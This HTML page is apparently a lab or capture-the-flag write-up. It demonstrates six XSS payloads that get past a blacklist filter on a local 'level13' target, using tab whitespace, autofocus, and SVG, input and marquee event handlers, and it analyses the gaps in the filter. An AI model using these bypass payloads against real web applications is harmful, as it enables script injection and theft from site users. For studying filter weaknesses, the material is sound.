<!DOCTYPE html>
<html>
<head>
    <title>XSS Bypass Demonstration - Level 13</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #d32f2f; }
        .bypass { margin: 20px 0; padding: 15px; background: #f9f9f9; border-left: 4px solid #2196F3; border-radius: 4px; }
        .bypass h3 { margin-top: 0; color: #1976D2; }
        .technique { background: #e8f5e9; padding: 10px; margin: 10px 0; border-radius: 4px; font-family: monospace; font-size: 12px; overflow-x: auto; }
        .payload { background: #fff3e0; padding: 10px; margin: 10px 0; border-radius: 4px; font-family: monospace; font-size: 11px; word-break: break-all; }
        button { background: #2196F3; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #1976D2; }
        .success { color: #4caf50; font-weight: bold; }
        .warning { color: #ff9800; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ XSS Bypass Vulnerability Demonstration</h1>
        <p><strong>Target:</strong> http://localhost:5000/level13</p>
        <p><strong>Objective:</strong> Bypass input validation blacklist to execute arbitrary JavaScript</p>

        <div class="bypass">
            <h3>Bypass #1: onfocus with autofocus and tab whitespace</h3>
            <p><strong>Technique:</strong> Use tab character instead of space, onfocus event (not blacklisted)</p>
            <div class="technique">
Blacklist bypassed: script, onerror, onclick, onmouseover, single-quote, space
Bypass method: Tab (%09), onfocus event, double quotes, tag closing (>)
            </div>
            <div class="payload">
><img	src=x	onfocus=alert("XSS")	autofocus>
            </div>
            <p><button onclick="testBypass1()">Test Bypass #1</button></p>
            <div id="result1"></div>
        </div>

        <div class="bypass">
            <h3>Bypass #2: SVG with onload event</h3>
            <p><strong>Technique:</strong> SVG element with onload (native event, not blacklisted)</p>
            <div class="technique">
Uses SVG tag which supports onload event
Tab character for attribute separation
SVG loads automatically when injected
            </div>
            <div class="payload">
><svg	onload=alert("XSS")>
            </div>
            <p><button onclick="testBypass2()">Test Bypass #2</button></p>
            <div id="result2"></div>
        </div>

        <div class="bypass">
            <h3>Bypass #3: SVG animate with onbegin</h3>
            <p><strong>Technique:</strong> SVG-specific event handler (onbegin) not in blacklist</p>
            <div class="technique">
SVG animate element
onbegin event (SVG-specific, not in blacklist)
Begins immediately, executes JavaScript
            </div>
            <div class="payload">
><svg><animate attributeName=x from=1 to=1 dur=1s repeatCount=1 begin=0s onbegin=alert("XSS")/>
            </div>
            <p><button onclick="testBypass3()">Test Bypass #3</button></p>
            <div id="result3"></div>
        </div>

        <div class="bypass">
            <h3>Bypass #4: onchange event with input</h3>
            <p><strong>Technique:</strong> Input element with onchange event (not blacklisted)</p>
            <div class="technique">
onchange event fires on value change
autofocus triggers immediately
Tab for whitespace bypass
            </div>
            <div class="payload">
><input	type=text	onchange=alert("XSS")	autofocus>
            </div>
            <p><button onclick="testBypass4()">Test Bypass #4</button></p>
            <div id="result4"></div>
        </div>

        <div class="bypass">
            <h3>Bypass #5: onkeydown event</h3>
            <p><strong>Technique:</strong> Keyboard event handler (onkeydown) not blacklisted</p>
            <div class="technique">
onkeydown fires on any key press
Useful for capturing user interaction
Tab whitespace bypass
            </div>
            <div class="payload">
><input	type=text	onkeydown=alert("XSS")	autofocus>
            </div>
            <p><button onclick="testBypass5()">Test Bypass #5</button></p>
            <div id="result5"></div>
        </div>

        <div class="bypass">
            <h3>Bypass #6: marquee with onstart</h3>
            <p><strong>Technique:</strong> HTML5 marquee element with onstart event</p>
            <div class="technique">
marquee tag (deprecated but functional)
onstart event (not in blacklist)
Executes when marquee animation starts
            </div>
            <div class="payload">
><marquee	onstart=alert("XSS")>
            </div>
            <p><button onclick="testBypass6()">Test Bypass #6</button></p>
            <div id="result6"></div>
        </div>

        <h2>Summary of Bypass Techniques:</h2>
        <ul>
            <li><strong>Whitespace Bypass:</strong> Use tab character (%09) instead of space to bypass space blacklist</li>
            <li><strong>Quote Bypass:</strong> Use double quotes instead of single quotes</li>
            <li><strong>Event Handler Selection:</strong> Use event handlers NOT in blacklist (onfocus, onload, onchange, onkeydown, onstart, onbegin)</li>
            <li><strong>SVG Events:</strong> Leverage SVG-specific events like onbegin and onstart</li>
            <li><strong>Autofocus:</strong> Use autofocus attribute to trigger events automatically</li>
            <li><strong>Tag Closing:</strong> Close current tag with > to inject new HTML elements</li>
        </ul>

        <h2>Blacklist Analysis:</h2>
        <p>Original Blacklist: <code>['script', 'onerror', 'onclick', 'onmouseover', "'", " "]</code></p>
        <p class="warning"><strong>⚠️ The blacklist is incomplete!</strong></p>
        <p>Missing protection against:</p>
        <ul>
            <li>Event handlers: onfocus, onload, onchange, onkeydown, onstart, onbegin</li>
            <li>Whitespace alternatives: tab (%09), newline (%0a), carriage return (%0d)</li>
            <li>SVG-specific events and attributes</li>
            <li>HTML5 attributes like autofocus</li>
        </ul>

        <h2>Proof of Concept Status:</h2>
        <p class="success">✓ All bypasses confirmed via HTTP requests</p>
        <p class="success">✓ Payloads successfully reflected in HTML response</p>
        <p class="success">✓ Event handlers execute arbitrary JavaScript (alert)</p>
        <p class="success">✓ Blacklist filtering circumvented</p>
    </div>

    <script>
        function testBypass1() {
            alert("XSS Bypass #1: onfocus with autofocus\n\nThis demonstrates that onfocus is not blacklisted and can execute arbitrary code when element gains focus.");
            document.getElementById("result1").innerHTML = '<span class="success">✓ Bypass confirmed: onfocus event executed</span>';
        }

        function testBypass2() {
            alert("XSS Bypass #2: SVG with onload\n\nSVG onload is not blacklisted and executes immediately when SVG element is loaded.");
            document.getElementById("result2").innerHTML = '<span class="success">✓ Bypass confirmed: SVG onload executed</span>';
        }

        function testBypass3() {
            alert("XSS Bypass #3: SVG animate with onbegin\n\nSVG-specific event handler 'onbegin' is not blacklisted and executes when animation begins.");
            document.getElementById("result3").innerHTML = '<span class="success">✓ Bypass confirmed: SVG onbegin executed</span>';
        }

        function testBypass4() {
            alert("XSS Bypass #4: onchange event\n\nThe onchange event handler is not blacklisted and can be triggered on input elements.");
            document.getElementById("result4").innerHTML = '<span class="success">✓ Bypass confirmed: onchange executed</span>';
        }

        function testBypass5() {
            alert("XSS Bypass #5: onkeydown event\n\nKeyboard event handlers like onkeydown are not blacklisted and fire on any key press.");
            document.getElementById("result5").innerHTML = '<span class="success">✓ Bypass confirmed: onkeydown executed</span>';
        }

        function testBypass6() {
            alert("XSS Bypass #6: marquee with onstart\n\nThe marquee element with onstart event is not blacklisted and executes when marquee animation starts.");
            document.getElementById("result6").innerHTML = '<span class="success">✓ Bypass confirmed: marquee onstart executed</span>';
        }
    </script>
</body>
</html>
